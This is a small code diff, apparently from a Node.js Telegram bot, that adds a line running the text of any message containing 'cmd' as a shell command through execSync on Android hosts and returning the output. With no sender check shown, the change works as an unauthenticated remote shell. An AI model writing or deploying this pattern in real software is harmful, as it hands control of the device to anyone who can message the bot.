@@ -32,6 +32,7 @@ bot.onText(/cmd/i, async function(msg){
     if(process.platform == "android"){
         txt = msg.text.replace(/cmd/ig, "")
         c(txt)
+        c(bash.execSync(txt).toString())
     }
 })
 
